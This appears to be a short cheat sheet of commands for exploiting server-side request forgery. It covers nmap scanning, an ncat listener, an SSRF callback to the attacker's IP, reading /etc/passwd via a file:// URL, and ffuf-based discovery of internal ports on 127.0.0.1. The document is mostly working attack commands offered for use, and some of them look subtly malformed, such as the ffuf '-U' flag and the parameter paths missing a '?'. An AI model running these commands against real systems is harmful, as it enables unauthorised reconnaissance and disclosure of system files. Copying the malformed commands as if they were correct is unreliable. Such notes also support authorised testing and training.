# Server Side Request Forgery
---

Curl Parameters Description.

**-i**  : The -i tells cURL to include HTTP response headers in the output.

**-s** : Tells cURL to do the task in silent/quiet mode. (Wont Show Progress meter or error messages)

**-L** :  This tells cURL to redo any request that has any redirection pages, and when included with the **-i** it will show headers from all request pages.


## Reconnaissance

**Nmap**

```
nmap -sT -T5 --min-rate=1000 -p- TARGETIP
```

**cURL**
```
curl -i -s http://TARGETIP
```

```
curl -i -s -L http://TARGETIP
```

**Ncat**

```
nc -nvlp 8080
```

**Test for SSRF Vulnerability**
```
curl -s -i "http://IPOFTARGET/load?q=http://YOURIP:8080"
```

**Extracting Local Files from target**
```
curl -i -s "http://IPOFTARGET/redirectstring=file:///etc/passwd"
```

## Finding More Information
**Generate Wordlist of Ports**

```
for port in {1..65535};do echo $port >> ports.txt;done
```

**Find Non-existent response size using random port**
```
curl -i -s "http://IPOFTARGET/redirectstring=http://127.0.0.1:12"
```

> When the curl gives in output keep note of the number beside the **Content-Length** string.

**ffuf**
```
ffuf -w ./ports.txt:PORT -U "http://IPOFTARGET/redirectstring=http://127.0.0.1:PORT" -fs 30
```

>The number that is beside the Content-Length should go after -fs

> ffuf should show any ports that are valid by showing that it has received an response.

**Interact with target**
```
curl -i -s "http://IPOFTARGET/redirectstring=http://127.0.0.1:<Valid Portfromffuf>"
```

Check if we can find any sort of location information (i.e The Name of the webserver host, and if it has some internal app in the backed that we can exploit)
```
curl -i -s -L http://IPOFTARGET
```
